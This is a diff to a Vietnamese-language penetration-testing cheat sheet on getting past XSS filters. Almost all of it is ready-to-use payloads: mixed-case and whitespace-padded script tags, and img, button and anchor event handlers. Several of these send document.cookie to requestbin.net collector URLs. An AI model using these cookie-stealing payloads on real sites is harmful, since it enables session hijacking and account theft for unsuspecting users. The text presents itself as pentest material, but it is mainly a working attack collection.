@@ -18,8 +18,7 @@ Trong quá trình pentest ứng dụng có thể gặp nhiều trường hợp c
 Tùy thuộc vào cơ chế filter mà có các cách bypass khác nhau. Nếu ví quá trình filter như người bảo vệ ứng dụng web thì quá trình bypass là quá trình luồn lách để qua mặt những người bảo vệ này. Khó thể nói có công thức nào tuyệt đối mà là sự tùy cơ ứng biến cho phù hợp từng hoàn cảnh. Hãy nhớ điều này.
 
 
-## 1. Các load js nguyên thủy (Không mask) huyền thoại 
-
+## Các load js nguyên thủy (Không mask) huyền thoại 
 ### Alert message
 ```<script>alert(1);</script>```
 
@@ -28,4 +27,16 @@ Tùy thuộc vào cơ chế filter mà có các cách bypass khác nhau. Nếu v
 
 ### Dùng image
 ```<script>new Image().src="http://requestbin.net/r/9d4pj5wl?c=".concat(document.cookie);</script>```
+
+## Các payload sử dụng mask
+### Case sensitive
+```<SCRIPT>alert(1);</SCRIPT>```
+```<ScRipT>alert(1);</sCriPt>```
+### Lọc thẻ script
+* Insert thêm ký tự (x09->Tab, x10->Escape)
+```<script  >alert(1);</script   >```
+* Không dùng thẻ script
+```<img src=x onerror=window.location="http://requestbin.net/r/5h067g6l?c=".concat(document.cookie)>```
+```<button autofocus onfocus=window.location="http://requestbin.net/r/5h067g6l?c=".concat(document.cookie)></button>```
+```<a onmouseover=window.location="http://requestbin.net/r/5h067g6l?c=".concat(document.cookie)>xxs link</a>```
 
